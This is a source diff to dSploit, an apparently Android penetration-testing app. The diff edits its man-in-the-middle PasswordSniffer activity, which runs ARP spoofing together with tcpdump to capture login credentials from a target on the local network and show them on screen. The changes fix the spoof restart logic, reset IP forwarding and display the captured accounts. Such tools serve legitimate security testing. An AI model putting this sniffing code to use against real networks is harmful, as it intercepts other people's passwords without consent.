@@ -18,9 +18,6 @@
  */
 package it.evilsocket.dsploit.plugins.mitm;
 
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
-
 import it.evilsocket.dsploit.R;
 import it.evilsocket.dsploit.system.Environment;
 import it.evilsocket.dsploit.system.Shell.OutputReceiver;
@@ -80,6 +77,8 @@ public class PasswordSniffer extends Activity
 		mArpSpoof.kill();
 		mTcpDump.kill();
 
+		Environment.setForwarding( false );
+		
 		mSniffProgress.setVisibility( View.INVISIBLE );
 		
 		mRunning = false;
@@ -109,21 +108,33 @@ public class PasswordSniffer extends Activity
 				{
 					Log.w( "ARPSPOOF", "Restarting arpspoof after SEGFAULT" );
 					spoof.kill();
-					spoof.spoof( Environment.getTarget(), this );
+					spoof.spoof( Environment.getTarget(), this ).start();
 				}
 			}
 
 			@Override
-			public void onEnd(int exitCode) { }
+			public void onEnd(int exitCode) { 
+				Log.w( "ARPSPOOF", "Ended with code " + exitCode );
+			}
 		};
 			
 		spoof.spoof( Environment.getTarget(), receiver ).start();
 		
 		dump.sniffPasswords( PCAP_FILTER, new PasswordReceiver(){
 			@Override
-			public void onAccountFound(String port, String protocol) {
-				// TODO Auto-generated method stub
+			public void onAccountFound( String data ) {
+				final String entry = data;
 				
+				PasswordSniffer.this.runOnUiThread( new Runnable() {
+					@Override
+					public void run(){
+						
+						if( mSniffText.getText().length() > 4096 )
+							mSniffText.setText("");
+						
+		            	mSniffText.append( entry + "\n\n" );
+					}							
+				});				
 			}
 			
 		}).start();
